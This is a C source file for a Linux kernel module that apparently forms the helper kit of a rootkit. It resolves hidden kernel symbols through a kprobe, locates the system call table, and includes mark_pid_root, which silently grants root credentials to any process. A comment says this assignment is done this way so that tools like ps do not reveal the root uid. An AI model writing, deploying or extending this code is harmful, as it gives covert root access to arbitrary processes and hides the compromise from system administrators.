//
// Created by fuqiuluo on 25-1-22.
//
#include <linux/kprobes.h>
#include "kkit.h"

int ovo_flip_open(const char *filename, int flags, umode_t mode, struct file **f) {
#if (LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0))
    *f = filp_open(filename, flags, mode);
    return *f == NULL ? -2 : 0;
#else
    static struct file* (*reserve_flip_open)(const char *filename, int flags, umode_t mode) = NULL;

    if (reserve_flip_open == NULL) {
        reserve_flip_open = (struct file* (*)(const char *filename, int flags, umode_t mode))ovo_kallsyms_lookup_name("filp_open");
        if (reserve_flip_open == NULL) {
            return -1;
        }
    }

    *f = reserve_flip_open(filename, flags, mode);
    return *f == NULL ? -2 : 0;
#endif
}

int ovo_flip_close(struct file **f, fl_owner_t id) {
#if (LINUX_VERSION_CODE < KERNEL_VERSION(5, 10, 0))
    filp_close(*f, id);
    return 0;
#else
    static struct file* (*reserve_flip_close)(struct file **f, fl_owner_t id) = NULL;

    if (reserve_flip_close == NULL) {
        reserve_flip_close = (struct file* (*)(struct file **f, fl_owner_t id))ovo_kallsyms_lookup_name("filp_close");
        if (reserve_flip_close == NULL) {
            return -1;
        }
    }

    reserve_flip_close(f, id);
    return 0;
#endif
}

bool is_file_exist(const char *filename) {
    struct file* fp;

    if(ovo_flip_open(filename, O_RDONLY, 0, &fp) == 0) {
        if (!IS_ERR(fp)) {
            ovo_flip_close(&fp, NULL);
            return true;
        }
        return false;
    }

//    // int kern_path(const char *name, unsigned int flags, struct path *path)
//    struct path path;
//    if (kern_path(filename, LOOKUP_FOLLOW, &path) == 0) {
//        return true;
//    }

    return false;
}

unsigned long ovo_kallsyms_lookup_name(const char *symbol_name) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    struct kprobe kp = {
            .symbol_name = "kallsyms_lookup_name"
    };

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    static kallsyms_lookup_name_t lookup_name = NULL;
    if (lookup_name == NULL) {
        if(register_kprobe(&kp) < 0) {
            return 0;
        }
        lookup_name = (kallsyms_lookup_name_t) kp.addr;
        unregister_kprobe(&kp);
    }
    return lookup_name(symbol_name);
#else
    return kallsyms_lookup_name(symbol_name);
#endif
}

unsigned long *ovo_find_syscall_table(void) {
    unsigned long *syscall_table;
    syscall_table = (unsigned long*)ovo_kallsyms_lookup_name("sys_call_table");
    return syscall_table;
}

int mark_pid_root(pid_t pid) {
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    struct pid * pid_struct = find_get_pid(pid);

    struct task_struct *task = pid_task(pid_struct, PIDTYPE_PID);
    if (task == NULL){
        printk(KERN_ERR "[daat] Failed to get current task info.\n");
        return -1;
    }

    static struct cred* (*my_prepare_creds)(void) = NULL;
    if (my_prepare_creds == NULL) {
        my_prepare_creds = (void *) ovo_kallsyms_lookup_name("prepare_creds");
        if (my_prepare_creds == NULL) {
            printk(KERN_ERR "[daat] Failed to find prepare_creds\n");
            return -1;
        }
    }

    struct cred *new_cred = my_prepare_creds();
    if (new_cred == NULL) {
        printk(KERN_ERR "[daat] Failed to prepare new credentials\n");
        return -ENOMEM;
    }
    new_cred->uid = kuid;
    new_cred->gid = kgid;
    new_cred->euid = kuid;
    new_cred->egid = kgid;

    // Dirty creds assignment so "ps" doesn't show the root uid!
    // If one uses commit_creds(new_cred), not only this would only affect
    // the current calling task but would also display the new uid (more visible).
    // rcu_assign_pointer is taken from the commit_creds source code (kernel/cred.c)
    rcu_assign_pointer(task->cred, new_cred);
    return 0;
}

int is_pid_alive(pid_t pid) {
    struct pid * pid_struct = find_get_pid(pid);
    if (!pid_struct)
        return false;

    struct task_struct *task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task)
        return false;

    return pid_alive(task);
}

